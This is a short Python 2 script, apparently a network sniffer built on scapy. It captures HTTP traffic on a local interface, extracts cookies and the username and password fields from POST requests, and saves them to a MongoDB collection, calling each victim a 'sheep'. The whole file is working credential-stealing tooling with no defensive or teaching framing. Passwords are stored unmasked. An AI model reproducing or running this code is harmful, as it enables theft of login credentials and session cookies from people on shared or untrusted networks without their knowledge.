from scapy.all import *
import scapy_http.http as HTTP
import re
from config import *
import pymongo

client = pymongo.MongoClient(MONGO_URL)
db = client[MONGO_DB]

def pkts_parse(pkt):
    if HTTP.HTTPRequest or HTTP.HTTPResponse in pkt:
        try:
            if pkt.Cookie != None:
                sheep = {
                    'host': pkt.Host,
                    'user': pkt.Path[0:20]+'*'*10,
                    'passorcookie' : pkt.Cookie[0:20]+'*'*10,
                    }
                save_to_mongo(sheep)
        except:
            pass 

    if HTTP.HTTPRequest in pkt and pkt.Method == 'POST':
        try:
            data = dict(i.split('=') for i in pkt.load.split('&'))
        except:
            return None
        user = ''
        passw = ''
        user_pattern = re.compile('username|login|user|email', re.I)
        pass_pattern = re.compile('password|pass', re.I)
        for key, value in data.items():
            if re.match(user_pattern, key):
                user = value
            if re.match(pass_pattern, key):
                passw = value
        if user != '' and passw != '':
            sheep = {
                'host': pkt.Host,
                'user': user,
                'passorcookie': passw
                }
            save_to_mongo(sheep)

def save_to_mongo(result):
    try:
        if db[MONGO_TABLE].insert(result):
            print 'save to mongodb successful ' + str(result) 
    except Exception, e:
        print 'save to mongodb failed ' + result
        print e

def main():
    sniff(iface=sniff_face, prn=pkts_parse, filter='tcp')

if __name__ == '__main__':
    main()
